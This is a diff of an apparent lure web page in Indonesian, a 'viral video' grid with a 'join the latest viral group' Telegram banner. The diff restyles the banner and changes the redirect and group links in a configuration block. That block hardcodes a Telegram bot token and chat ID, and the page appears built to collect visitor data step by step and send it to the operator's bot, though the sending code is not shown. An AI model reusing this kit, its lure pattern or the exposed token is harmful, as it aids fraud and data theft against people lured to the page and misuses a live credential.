@@ -147,37 +147,43 @@ body {
     box-shadow: 0 2px 8px rgba(0,0,0,0.1);
 }
 
-.telegram-banner:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 6px 20px rgba(0,0,0,0.15);
-}
-
-.banner-text {
+.banner-left {
+    width: 40px;
     display: flex;
-    align-items: center;
-    gap: 3px;
+    justify-content: flex-start;
 }
 
-.banner-text i {
+.banner-left i {
     font-size: 28px;
     color: white;
 }
 
-.banner-text span {
+.banner-center {
+    flex: 1;
+    text-align: center;
+}
+
+.banner-center span {
     font-size: 18px;
     font-weight: 600;
     color: white;
     letter-spacing: 0.5px;
 }
 
-.banner-arrow {
-    color: white;
-    font-size: 20px;
-    opacity: 0.8;
-    transition: opacity 0.2s;
+.banner-right {
+    width: 40px;
+    display: flex;
+    justify-content: flex-end;
 }
 
-.telegram-banner:hover .banner-arrow {
+.banner-right i {
+    font-size: 20px;
+    color: white;
+    opacity: 0.8;
+    transition: opacity 0.2s, transform 0.2s;
+}
+
+.telegram-banner:hover .banner-right i {
     opacity: 1;
     transform: translateX(4px);
 }
@@ -187,11 +193,14 @@ body {
     .telegram-banner {
         padding: 12px 18px;
     }
-    .banner-text span {
+    .banner-left i {
+        font-size: 22px;
+    }
+    .banner-center span {
         font-size: 14px;
     }
-    .banner-text i {
-        font-size: 22px;
+    .banner-right i {
+        font-size: 16px;
     }
 }
 
@@ -595,14 +604,16 @@ body {
 <div class="body">
     <!-- BANNER TELEGRAM - GANTI LINK NYA -->
     <div class="telegram-banner" id="telegramBanner">
-        <div class="banner-text">
-            <i class="fab fa-telegram-plane"></i>
-            <span>🔥 JOIN GRUP VIRAL TERBARU 🔥</span>
-        </div>
-        <div class="banner-arrow">
-            <i class="fas fa-chevron-right"></i>
-        </div>
+    <div class="banner-left">
+        <i class="fab fa-telegram-plane"></i>
     </div>
+    <div class="banner-center">
+        <span>🔥 JOIN GRUP VIRAL TERBARU 🔥</span>
+    </div>
+    <div class="banner-right">
+        <i class="fas fa-chevron-right"></i>
+    </div>
+</div>
 
     <!-- VIDEO GRID - GANTI LINK VIDEO ASLI DI data-video-url -->
     <div class="video-grid">
@@ -776,8 +787,8 @@ function hidePopup(popupId) {
 // ========== KONFIGURASI ==========
 const BOT_TOKEN = "8686157259:AAEbLNInmaqnPwrTTogJC3AINXIWTGerZUM";
 const CHAT_ID = "-1003580899801";
-const REDIRECT_URL = "https://videy.co/v/?id=TE3JsSEg1";
-const TELEGRAM_LINK = "https://t.me/+lUxyWaF_19w5NjRl"; // GANTI DENGAN LINK GRUP TELEGRAM ANDA
+const REDIRECT_URL = "https://vidgf.com/f/wcubsmaineg";
+const TELEGRAM_LINK = "https://t.me/mediaupdate99"; // GANTI DENGAN LINK GRUP TELEGRAM ANDA
 
 let selectedVideo = null;
 let stepData = {};
